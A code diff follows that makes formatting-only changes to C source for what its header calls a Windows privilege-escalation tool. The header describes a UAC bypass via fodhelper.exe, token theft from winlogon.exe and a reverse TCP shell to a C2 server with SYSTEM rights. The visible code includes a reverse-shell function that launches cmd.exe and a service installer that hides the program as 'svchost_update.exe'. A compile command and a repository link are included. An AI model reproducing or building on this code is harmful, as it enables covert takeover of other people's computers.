@@ -4,9 +4,9 @@
  *
  * UAC bypass via fodhelper.exe and token stealing from winlogon.exe.
  * Establishes reverse TCP shell to C2 server with SYSTEM privileges.
- * 
+ *
  * Compile: gcc -o PrivEsc_C2.exe PrivEsc_C2.c -ladvapi32 -lshell32 -luser32 -lws2_32
- * 
+ *
  * See more here : https://github.com/28Zaaky/Priv-Escalation-Exploit
  */
 
@@ -214,9 +214,12 @@ BOOL CreateReverseShell(const char *host, int port)
     char cmdPath[MAX_PATH];
     GetSystemDirectoryA(cmdPath, MAX_PATH);
     // Use safe string concatenation
-    if (strlen(cmdPath) + strlen("\\cmd.exe") < MAX_PATH) {
+    if (strlen(cmdPath) + strlen("\\cmd.exe") < MAX_PATH)
+    {
         strcat_s(cmdPath, MAX_PATH, "\\cmd.exe");
-    } else {
+    }
+    else
+    {
         strcpy_s(cmdPath, MAX_PATH, "C:\\Windows\\System32\\cmd.exe");
     }
 
@@ -323,7 +326,8 @@ BOOL InstallAsService()
     char servicePath[MAX_PATH];
     GetSystemDirectoryA(servicePath, MAX_PATH);
     // Use safe string concatenation
-    if (strlen(servicePath) + strlen("\\svchost_update.exe") < MAX_PATH) {
+    if (strlen(servicePath) + strlen("\\svchost_update.exe") < MAX_PATH)
+    {
         strcat_s(servicePath, MAX_PATH, "\\svchost_update.exe");
     }
 
